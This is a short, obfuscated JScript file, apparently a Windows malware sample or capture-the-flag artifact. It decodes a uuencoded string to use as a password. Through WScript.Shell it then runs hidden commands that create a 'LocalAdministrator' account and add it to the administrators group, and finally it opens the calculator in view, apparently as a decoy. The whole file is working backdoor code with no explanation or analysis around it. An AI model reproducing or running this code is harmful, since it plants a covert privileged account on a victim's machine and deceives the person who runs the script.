function a(b) {
    var c = "",
        d = b.split("\n");
    for (var e = 0; e < d.length; e++) {
        var f = d[e].replace(/^\s+|\s+$/g, '');
        if (f.indexOf("begin") === 0 || f.indexOf("end") === 0 || f === "") continue;
        var g = (f.charCodeAt(0) - 32) & 63;
        for (var h = 1; h < f.length; h += 4) {
            if (h + 3 >= f.length) break;
            var i = (f.charCodeAt(h) - 32) & 63,
                j = (f.charCodeAt(h + 1) - 32) & 63,
                k = (f.charCodeAt(h + 2) - 32) & 63,
                l = (f.charCodeAt(h + 3) - 32) & 63;
            c += String.fromCharCode((i << 2) | (j >> 4));
            if (h + 2 < f.length - 1) c += String.fromCharCode(((j & 15) << 4) | (k >> 2));
            if (h + 3 < f.length - 1) c += String.fromCharCode(((k & 3) << 6) | l)
        }
    }
    return c.substring(0, g)
}
var m = "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
var n = a(m);
var o = ["net user LocalAdministrator " + n + " /add", "net localgroup administrators LocalAdministrator /add", "calc.exe"];
var p = new ActiveXObject('WScript.Shell');
for (var q = 0; q < o.length - 1; q++) {
    p.Run(o[q], 0, false)
}
p.Run(o[2], 1, false);